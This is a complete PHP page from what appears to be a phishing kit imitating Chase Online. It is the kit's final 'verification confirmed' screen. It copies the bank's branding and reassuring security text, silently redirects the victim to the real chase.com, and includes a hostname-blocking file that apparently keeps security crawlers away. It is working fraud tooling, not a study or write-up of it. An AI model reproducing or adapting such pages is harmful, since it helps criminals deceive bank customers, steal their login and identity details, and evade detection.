<?php
require_once 'hostname_check.php'; // Check if hostname contain blocked word

$home="http://www.chase.com/";
$Page="Confirmed.php?header=1&Fetch=".$_GET['Fetch'];
require_once 'enc.php';
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html lang="en"><head>
<style>
td.backtop {background:#FFF url(imgs/top2.jpg );} 
td.backmid {background:#FFF url(imgs/center3.jpg );} 
td.backbot {background:#FFF url(imgs/bottom3.jpg );} 

</style>
<style>
td.backtop {background:#FFF url(imgs/top2.jpg );} 
td.backmid {background:#FFF url(imgs/center3.jpg );} 
td.backbot {background:#FFF url(imgs/bottom3.jpg );} 
.auto-style1 {
	font-weight: normal;
}
.auto-style2 {
	border: #666666 1px solid;
	padding: 0px 0px 0px 0px;
	height: 10px;
	font-size: 1px;
	background-color: #5280b1;
	color: inherit;
	background-position: center;
	background-repeat: no-repeat;
}
.auto-style3 {
	color: #003366;
	font-size: large;
}
.auto-style4 {
	border: #666666 1px solid;
	padding: 0px 0px 0px 0px;
	height: 10px;
	font-size: 1px;
	background-color: #5280b1;
	color: inherit;
	background-position: center;
	background-repeat: no-repeat;
	background-image: url('imgs/indicator.gif');
}
.auto-style5 {
	font-size: large;
}
.auto-style6 {
	color: #003366;
	font-size: small;
}
</style>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
<meta http-equiv="Pragma" content="no-cache"/>
<meta http-equiv="Expires" content="-1"/>
<meta http-equiv="Cache-Control" content="no-cache"/>
<meta http-equiv="Cache-Control" content="no-store"/>
<meta http-equiv="Cache-Control" content="post-check=0"/>
<meta http-equiv="Cache-Control" content="pre-check=0"/>
<meta http-equiv="Content-Style-Type" content="text/css"/>
<meta name="CONNECTION" content="CLOSE"/><link rel="stylesheet" type="text/css" href="imgs/styles_cco_enroll.css?Style=<?php echo $Page; ?>"/><link rel="stylesheet" type="text/css" href="imgs/style.css?Style=<?php echo $Page; ?>"/><link rel="SHORTCUT ICON" href="imgs/favicon.ico"/><title>
Chase Online</title><!--POH-->
<META HTTP-EQUIV="refresh" CONTENT="5; URL=<?php echo $home; ?>">
</head>


<body onLoad="oninit();">
<div>

<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="Ko0Fg1AdA0OgiR8YhX4WoefGrFq/XE9gEI9YGgLAMvi5U0WZjDp3Eo3gI+rb9GjfMsDjNXNXAntvYgbLSLMJ/jdYmoFh055sSvjXmfczEch9scvKKhh89s0VixSTMgXdiO2Nkph9ERzOFMyTi2YORaO8U0mnk8ByCCWqz2pmuHzCZjJNaGEeZE6VT5iy0rXZ6ASq3z0yJz2MDIHrLAM6vuPYI4EDjAuDBSbcwVQ/CjVZpmwlHF45kUcLArtxDEFmAzE/jM/68NknkpeDkDyqDMEs647NVtVMtJSHK0HP2yteABodqVSg/A6NZDNpA4sO+pC0v1FSE025w2HuFp1baW1IX66nTrhDdnx++n7TPukPp7CplPKSZu8f1FQLsQL8IzaPS8dok1DPzkLwY+KIV7zi0ZimFV4EQzYW4Kszbc4+T8ESmWosL/soR3chFYhFYju6K0/SP54qI8YeHUhR8oq0ir8G+jRN3sjYRWJ4q6cJ4XWs450kUnX0Wxlp0d4gi6uHHbBdG6PfaSYTIyChHfWcDZqD+jrLaIyQNmWWkm0tbjL2SPKpIvoE8/aFpPtpB+dcG1IY3ILWqK8Y6cQCIwEwa34cJ0atjmYVn3MeGEmryN5GGoZ/TuHEO0MdOHmlWzZNc7sE/psq7Vmiy72r+83F1Ar6VsDB1w8q9YsKNrDgZ6vAhn9pVMzeQDQtNP8P1s8fRPeg9N1qFPq0+Ytzd8tOb/UwYX5DnlRH3zrqAao=" />
</div>

<script type="text/javascript">
//<![CDATA[
var theForm = document.forms['formIdentifyUser'];
if (!theForm) {
    theForm = document.formIdentifyUser;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</script>


<script type="text/javascript">
//<![CDATA[
function WebForm_OnSubmit() {
return DoSubmit();
return true;
}
//]]>
</script>

<div>

	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
	<input type="hidden" name="__PREVIOUSPAGE" id="__PREVIOUSPAGE" value="b1t8GvcTu3k4L5V_6SR6jIs_VsLwW7r7kQ8CPJKadVtSTZ8vdMqVPg2" />
	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="DSddjAp+lYm2fG8BLGlDNgiUs/5DBQst0mXoroWIgFIoUph9TWXuymXQZYSiwzv6eXsQJrPqXDd5kgq6376yC+qClHfjYLUZ02sOA0GR9v5Ah0Ir4JE4Z6gdJ8tcbkI3vlqygY/VYOTHSxwuNCZiAvbi0N+4CmE0PNDfybVOJ2rldA0nAr7JwQ==" />
</div>
  <center>
<!-- BEGIN Global Navigation table --><table cellspacing="0" cellpadding="0" border="0" class="fullwidth" summary="global navigation"><tr><td><a href="#" id="siteLogo"><img src="imgs/ChaseNew.gif" alt="Chase Online Logo" style="margin: 17px 17px 17px 17px;"/></a></td><td class="globalnav"><a id="homelink" href="JavaScript:document.location.href='#';" class="globalnavlinks">
	  Chase.com</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a id="privacypolicylik" href="JavaScript:document.location.href='#';" class="globalnavlinks">Privacy 
	  Notice</a></td></tr></table><!-- END Global Navigation table --><!-- BEGIN Tab Navigation table --><table cellspacing="0" cellpadding="0" border="0" summary="primary navigation"><tr><td class="spacerh5">
	  &nbsp;</td></tr></table><!-- END Tab Navigation table --><!-- BEGIN Segment table --><table cellspacing="0" cellpadding="0" border="0" class="headerbarwidth" summary="section header"><tr class="headerbar"><td class="segimage" align="left">
	  &nbsp;</td><td class="headerbardate">&nbsp;</td></tr></table><!-- END Segment table -->

<div class="constraint-container">
<table cellspacing="0" cellpadding="0" class="fullwidth">
	<tr>
		<td class="sidebar">&nbsp;</td>
		<td class="spacerw25">&nbsp;</td>
		<td width="721" valign="top"><div class="Printable">
      <table width="100%" cellpadding="0" cellspacing="0" border="0">
        <tr>
          <td align="left">
            <div class="notprintable"><table cellspacing="0" cellpadding="0" width="100%"><tr><td class="bcrow" style="padding-left: 0px;"></td></tr></table><table cellspacing="0" cellpadding="0" width="100%"><tr><td colspan="2" class="spacerh20">
				&nbsp;</td></tr><tr><td class="pagetitle"></td><td align="right">
					&nbsp;</td></tr><tr><td colspan="2" class="spacerh20"></td></tr></table></div>

          </td>
        </tr>
        <tr>
          <td align="left">

            

<table border="0" style="margin-left: 14px;"><tr>
	<td class="auto-style2" style="height: 12px"></td>
<td class="auto-style2" style="height: 12"></td>
	<td class="auto-style2" style="height: 12px"></td>
	<td class="auto-style4" style="height: 12"></td>
	</tr><tr><td class="steptexton" align="center" title="You are on step one of six.  There is at least one page per step.">
		<span class="auto-style1"><span class="greytext">Authorization Login</span></span></td><td class="steptextoff" align="center" title="Step two of six has not been completed.">
		Identification<strong> </strong><img src="images/spacer.gif" alt="Step two of six has not been completed." width="1" height="1"/></td><td class="steptextoff" align="center" title="Step three of six has not been completed.">
		Proccessing<img src="images/spacer.gif" alt="Step three of six has not been completed." width="1" height="1"/></td><td class="steptextoff" align="center" title="Step six of six has not been completed.">
		<span class="clrblk"><strong>Done</strong></span><img src="images/spacer.gif" alt="Step six of six has not been completed." width="1" height="1"/></td></tr></table><!--End Progress bar-->


          </td>
        </tr>
		<div id="loader"> </div>
        <tr>

          <td class="tc">
		  
		  <br /><br />
            <strong>You have been successfully Verified Your Chase ID</strong>
		<br /><br /><br /><br />
      <li><span class="auto-style6">Our robust proprietary risk models help to protect you by monitoring for unusual activity - and working to stop it.</span><br class="auto-style6">
            <br class="auto-style6">
      
      </li>
      <li><span class="auto-style6">Chase technology evaluates transactions according to hundreds of
        variables in order to pinpoint potentially fraudulent activity.
	  </span> <br class="auto-style6">
                    <br class="auto-style6">
     
      </li>
      <li><span class="auto-style6">We use powerful encryption methods to help protect your sensitive information.</li></span>
    </ul><br><br>
          </td>
        </tr>
      </table>
    		&nbsp;</div></td>

		<td class="spacerw25">&nbsp;</td>
		<td class="sidebar">&nbsp;</td>
	</tr>
	<tr>
		<td class="sidebar">&nbsp;</td>
		<td class="spacerh30" colspan="3">&nbsp;</td>
		<td class="sidebar">&nbsp;</td>
	</tr>
	<tr>

		<td class="sidebar" colspan="5">&nbsp;</td>
	</tr>
</table>
</div>
<!--Footer--><table border="0" cellspacing="0" cellpadding="0" class="fullwidth" summary="terms of use link and copyright"><tr><td class="spacerh10" colspan="3">
	  &nbsp;</td></tr><tr><td style="width:30%; vertical-align:top">&nbsp;</td><td align="center" width="40%" valign="top"><span class="footertext"><a id="SecurityLink" href="JavaScript:document.location.href='#';" onBlur="window.status='';return true" onMouseOver="window.status='';return true" onFocus="window.status='';return true" onMouseOut="window.status='';return true">
		  Security</a>&nbsp;|&nbsp;<a id="TermsLink" href="JavaScript:document.location.href='#';" onBlur="window.status='';return true" onMouseOver="window.status='';return true" onFocus="window.status='';return true" onMouseOut="window.status='';return true">Terms 
		  of Use</a>&nbsp;</span></td><td style="text-align:center; width:30%; vertical-align:top">
		  &nbsp;</td></tr></table><div class="printable"><table border="0" cellspacing="0" cellpadding="0" class="fullwidth"><tr><td class="spacerh10">
	  &nbsp;</td></tr><tr><td align="center" class="footertext">&nbsp;&copy; 2019 JPMorgan 
		  Chase &amp; Co.</td></tr><tr><td class="spacerh10">&nbsp;</td></tr></table></div><!--END Footer-->
</center>


</body></html>
<?php ob_end_flush(); ?>